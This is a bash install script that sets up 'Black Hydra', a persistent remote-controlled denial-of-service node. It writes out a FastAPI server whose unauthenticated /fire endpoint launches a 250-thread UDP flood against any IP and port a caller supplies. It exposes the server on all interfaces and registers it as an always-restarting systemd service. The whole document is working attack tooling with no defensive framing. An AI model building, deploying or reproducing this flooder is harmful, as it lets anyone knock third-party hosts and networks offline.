#!/bin/bash

echo "[*] Installing dependencies..."
sudo apt update && sudo apt install -y python3-pip python3-venv

echo "[*] Setting up virtual environment..."
python3 -m venv blackhydra_env
source blackhydra_env/bin/activate

echo "[*] Installing Python modules..."
pip install fastapi uvicorn

echo "[*] Creating attack server..."
cat <<EOF > blackhydra_api.py
import socket
import threading
import time
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn

app = FastAPI()

class AttackPayload(BaseModel):
    command: str
    target_ip: str
    target_port: int
    attack_type: str
    duration: int = 3

@app.post("/fire")
def fire_attack(payload: AttackPayload):
    if payload.command != "execute_attack" or payload.attack_type != "udp_flood":
        raise HTTPException(status_code=400, detail="Unsupported or malformed request")

    def burst_flood():
        timeout = time.time() + payload.duration
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = socket.getrandbits(1024).to_bytes(128, 'big')
            while time.time() < timeout:
                try:
                    sock.sendto(msg, (payload.target_ip, payload.target_port))
                except:
                    break
            sock.close()

        threads = [threading.Thread(target=worker) for _ in range(250)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    threading.Thread(target=burst_flood, daemon=True).start()
    return {"status": "attack_dispatched", "target": payload.target_ip, "port": payload.target_port, "duration": payload.duration}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=5000)
EOF

echo "[*] Creating systemd service..."
cat <<EOF | sudo tee /etc/systemd/system/blackhydra.service
[Unit]
Description=Black Hydra API Server
After=network.target

[Service]
User=$USER
WorkingDirectory=$(pwd)
ExecStart=$(pwd)/blackhydra_env/bin/python $(pwd)/blackhydra_api.py
Restart=always

[Install]
WantedBy=multi-user.target
EOF

echo "[*] Enabling and starting service..."
sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl enable blackhydra.service
sudo systemctl start blackhydra.service

echo "[+] Black Hydra API is live on port 5000"
